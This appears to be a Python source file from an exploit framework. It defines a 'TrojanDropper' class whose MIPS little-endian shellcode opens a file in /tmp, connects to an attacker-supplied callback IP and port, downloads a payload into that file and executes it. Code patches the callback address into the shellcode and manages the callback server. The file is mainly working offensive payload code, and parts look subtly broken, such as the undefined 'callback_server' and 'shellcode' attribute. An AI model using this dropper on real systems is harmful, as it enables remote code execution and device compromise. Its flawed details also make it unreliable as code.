# Copyright (c) 2013
# - Zachary Cutlip <uid000@gmail.com>
# - Tactical Network Solutions, LLC
# 
# See LICENSE.txt for more details.
# 
import string
import socket
import os
import signal
from ...common.support import BigEndian,LittleEndian


class TrojanDropper:
    shellcodes={}
    shellcodes[LittleEndian] = string.join([
        "\x6d\x70\x0f\x3c", # lui	t7,0x706d
        "\x2f\x74\xef\x35", # ori	t7,t7,0x742f
        "\xf4\xff\xaf\xaf", # sw	t7,-12(sp)
        "\x72\x70\x0e\x3c", # lui	t6,0x7072
        "\x2f\x64\xce\x35", # ori	t6,t6,0x642f
        "\xf8\xff\xae\xaf", # sw	t6,-8(sp)
        "\xfc\xff\xa0\xaf", # sw	zero,-4(sp)
        "\xf4\xff\xa4\x27", # addiu	a0,sp,-12
        "\x11\x01\x05\x24", # li	a1,273
        "\xff\x01\x06\x24", # li	a2,511
        "\xa5\x0f\x02\x24", # li	v0,4005
        "\x0c\x01\x01\x01", # syscall	0x40404
        "\xd4\xff\xa2\xaf", # sw	v0,-44(sp)
        "\xfd\xff\x0f\x24", # li	t7,-3
        "\x27\x28\xe0\x01", # nor	a1,t7,zero
        "\xe2\xff\xa5\xaf", # sw	a1,-30(sp)
        "\xe2\xff\xa4\x8f", # lw	a0,-30(sp)
        "\xff\xff\x06\x28", # slti	a2,zero,-1
        "\x57\x10\x02\x24", # li	v0,4183
        "\x0c\x01\x01\x01", # syscall	0x40404
        "\xff\xff\xa2\xaf", # sw	v0,-1(sp)
        "\xff\xff\xa4\x8f", # lw	a0,-1(sp)
        "\xe2\xff\xa5\xaf", # sw	a1,-30(sp)
        "PORT1PORT2\x0e\x3c", # lui	t6,0x901f port 8080
        "PORT1PORT2\xce\x35", # ori	t6,t6,0x901f port 8080
        "\xe4\xff\xae\xaf", # sw	t6,-28(sp)
        "IP2IP3\x0d\x3c", # lui	t5,<ip high>
        "IP0IP1\xad\x35", # ori	t5,t5,<ip low>
        "\xe6\xff\xad\xaf", # sw	t5,-26(sp)
        "\xe2\xff\xa5\x27", # addiu	a1,sp,-30
        "\xef\xff\x0c\x24", # li	t4,-17
        "\x27\x30\x80\x01", # nor	a2,t4,zero
        "\x4a\x10\x02\x24", # li	v0,4170
        "\x0c\x01\x01\x01", # syscall	0x40404
        "\xff\xff\x06\x28", # slti	a2,zero,-1
        "\xd4\xff\xa4\x8f", # lw	a0,-44(sp)
        "\xd0\xff\xa5\x27", # addiu	a1,sp,-48
        "\xa4\x0f\x02\x24", # li	v0,4004
        "\x0c\x01\x01\x01", # syscall	0x40404
        "\xff\xff\xa4\x8f", # lw	a0,-1(sp)
        "\xd0\xff\xa5\x27", # addiu	a1,sp,-48
        "\xff\x0f\x06\x28", # slti	a2,zero,4095
        "\xa3\x0f\x02\x24", # li	v0,4003
        "\x0c\x01\x01\x01", # syscall	0x40404
        "\xf6\xff\x40\x1c", # bgtz	v0,88 <write_file>
        "\xa6\x0f\x02\x24", # li	v0,4006
        "\x0c\x01\x01\x01", # syscall	0x40404
        "\xd4\xff\xa4\x8f", # lw	a0,-44(sp)
        "\xa6\x0f\x02\x24", # li	v0,4006
        "\x0c\x01\x01\x01", # syscall	0x40404
        "\xf4\xff\xa4\x27", # addiu	a0,sp,-12
        "\xd0\xff\xa4\xaf", # sw	a0,-48(sp)
        "\xd4\xff\xa2\xaf", # sw	v0,-44(sp)
        "\xff\xff\x06\x28", # slti	a2,zero,-1
        "\xab\x0f\x02\x24", # li	v0,4011
        "\x0c\x01\x01\x01"  # syscall	0x40404
],'')

    def __init__(self,exploit_callback):
        callback_ip=exploit_callback.callback_ip
        callback_port=int(callback_server.port)

        shellcode=self.__class__.shellcode
        i = 0
        for c in socket.inet_aton(callback_ip):
            shellcode = shellcode.replace("IP%d" % i, c)
            i+=1
        shellcode=shellcode.replace("PORT1",chr(callback_port >> 8))
        shellcode=shellcode.replace("PORT2",chr(callback_port & 0xFF))
        self.shellcode=shellcode
        self.callback=exploit_callback

    def serve_callback(self):
        self.callback_pid=self.callback.serve_callback()
        return self.callback_pid

    def stop_server(self):
        os.kill(self.callback_pid,signal.SIGTERM)

    def wait_til_done(self):
        try:
            os.waitpid(self.callback_pid,0)
        except Exception as e:
            print e
            raise e


